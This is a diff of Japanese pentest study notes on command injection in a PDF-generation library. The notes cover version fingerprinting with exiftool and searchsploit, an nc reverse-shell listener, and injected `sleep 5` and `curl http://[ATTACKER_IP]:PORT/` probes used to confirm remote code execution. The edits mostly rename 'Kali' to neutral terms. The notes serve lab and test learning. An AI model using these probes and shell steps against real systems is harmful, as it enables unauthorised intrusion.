@@ -81,7 +81,7 @@ curl http://[TARGET]/api/v1/admin/auth -H "Cookie: PHPSESSID=<セッション>"
 
 > リバースシェルの仕組み・ポート選択・VPN環境でのIP確認 → `../../06_Concepts/Reverse_Shell.md`
 
-**攻撃側（Kali）でリスナーを起動：**
+**テスター端末でリスナーを起動：**
 ```bash
 nc -lvnp 4444
 ```
@@ -135,8 +135,8 @@ curl -X POST http://[TARGET]/api/v1/admin/vpn/generate \
 - 生成された PDF のメタデータにライブラリ名とバージョンが含まれる
 
 ### 環境前提
-- 実行環境: Kali（攻撃側）+ ターゲット（PDF / 画像変換ライブラリが動作中）
-- 必要なツール: `exiftool`（Kali標準）、`nc`（Kali標準）、`python3`（Kali標準）
+- 実行環境: テスター端末 + ターゲット（PDF / 画像変換ライブラリが動作中）
+- 必要なツール: `exiftool`（ペネトレ用Linuxディストリ標準）、`nc`（ペネトレ用Linuxディストリ標準）、`python3`（ペネトレ用Linuxディストリ標準）
 
 ### 観点・着眼点
 
@@ -145,7 +145,7 @@ curl -X POST http://[TARGET]/api/v1/admin/vpn/generate \
 2. 生成物（PDF 等）のメタデータでライブラリ名・バージョンを確認
 
 ```bash
-# [Kali] PDF のメタデータ確認
+# [Attacker] PDF のメタデータ確認
 exiftool [ダウンロードした].pdf
 # → "Producer", "Creator" 等にライブラリ名・バージョンが出る
 # 例: Producer : pdfkit v0.8.6
@@ -154,7 +154,7 @@ exiftool [ダウンロードした].pdf
 3. バージョンが判明したら即 searchsploit → CVE を特定する
 
 ```bash
-# [Kali] バージョン検索
+# [Attacker] バージョン検索
 searchsploit pdfkit
 searchsploit [ライブラリ名] [バージョン]
 ```
@@ -164,7 +164,7 @@ searchsploit [ライブラリ名] [バージョン]
 | テスト内容 | 結果 | 意味 |
 |-----------|------|------|
 | URL パラメータに `` `sleep 5` `` を含めて送信 | 応答が 5 秒遅延する | コマンドが実行されている（タイムベース確認） |
-| `` `curl http://[KALI_IP]:PORT/` `` を送信し nc で待機 | nc に GET リクエストが届く | OOB で RCE 確認 |
+| `` `curl http://[ATTACKER_IP]:PORT/` `` を送信し nc で待機 | nc に GET リクエストが届く | OOB で RCE 確認 |
 
 ### 手順概要（ペイロード全文は CVE_Notes.md を参照）
 
@@ -182,7 +182,7 @@ searchsploit [ライブラリ名] [バージョン]
 
 ### 注意点・落とし穴
 - HTTP サーバー（シェルスクリプト配信）は **nc リスナーより先に起動する**
-- VPN 環境では `[ATTACKER_IP]` に `tun0` の IP を使う（`ip addr show tun0`）
+- `[ATTACKER_IP]` にはテスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等が変わる）の IP を使う。`ip a` で全インターフェース確認
 - シェル取得直後は TTY なし → sudo -l 等の前に必ずシェル安定化を行う
 
 ### 関連技術
